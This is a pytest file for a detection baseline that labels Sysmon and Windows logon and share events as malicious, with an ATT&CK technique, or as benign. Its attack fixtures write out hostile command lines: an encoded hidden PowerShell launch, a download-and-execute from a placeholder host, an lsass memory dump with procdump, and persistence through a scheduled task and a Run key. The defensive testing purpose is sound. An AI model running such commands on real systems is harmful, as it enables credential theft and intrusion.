import pytest

from app.parsers.sysmon import parse_sysmon_json
from eval import baseline
from tests.conftest import REF_TIME, sysmon

PSH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def predict(**fields):
    return baseline.predict(parse_sysmon_json(sysmon(**fields), REF_TIME))


@pytest.mark.parametrize(
    "fields, technique",
    [
        ({"Image": PSH, "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA"}, "T1059.001"),
        ({"Image": PSH, "CommandLine": "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/a')"}, "T1059.001"),
        ({"EventID": 1, "Image": "C:\\Users\\Public\\p.exe", "CommandLine": "procdump.exe -ma lsass.exe l.dmp"}, "T1003.001"),
        ({"EventID": 10, "SourceImage": "C:\\Users\\Public\\x.exe", "TargetImage": "C:\\Windows\\System32\\lsass.exe",
          "GrantedAccess": "0x1410", "CommandLine": None}, "T1003.001"),
        ({"Image": "C:\\Windows\\System32\\schtasks.exe",
          "CommandLine": "schtasks /create /tn U /tr C:\\Users\\Public\\a.exe /sc onlogon"}, "T1053.005"),
        ({"EventID": 13, "Image": PSH, "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\U",
          "Details": "C:\\Users\\Public\\a.exe", "CommandLine": None}, "T1547.001"),
        ({"EventID": 5145, "ShareName": "\\\\*\\ADMIN$", "RelativeTargetName": "svc.exe", "CommandLine": None}, "T1021.002"),
        ({"EventID": 4625, "ProcessName": "C:\\Users\\x\\Downloads\\spray.exe", "TargetUserName": "a", "User": None,
          "Image": None, "CommandLine": None}, "T1110"),
    ],
)
def test_attacks_the_rules_are_written_for_are_caught(fields, technique):
    assert predict(**fields) == ("malicious", technique)


@pytest.mark.parametrize(
    "fields",
    [
        {"Image": PSH, "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File D:\\IT\\Install-Updates.ps1"},
        {"Image": PSH, "CommandLine": "powershell.exe Get-Content a.txt | Out-File -Encoding UTF8 b.txt"},  # -Encoding is not -enc
        {"EventID": 10, "SourceImage": "C:\\Program Files\\CrowdStrike\\CSFalconService.exe",
         "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1410", "CommandLine": None},
        {"EventID": 13, "Image": "C:\\Windows\\System32\\msiexec.exe",
         "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive",
         "Details": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background", "CommandLine": None},
        {"EventID": 5145, "ShareName": "\\\\*\\D$", "RelativeTargetName": "Backups\\full.vhdx", "CommandLine": None},
        {"EventID": 4625, "ProcessName": "C:\\Windows\\System32\\winlogon.exe", "TargetUserName": "a", "User": None,
         "Image": None, "CommandLine": None},
    ],
)
def test_routine_activity_is_not_flagged(fields):
    assert predict(**fields) == ("benign", None)


def test_the_baseline_never_asks_for_a_human():
    assert {v for v, _ in (predict(), predict(Image=PSH, CommandLine="powershell.exe -enc AAAA"))} <= {"malicious", "benign"}
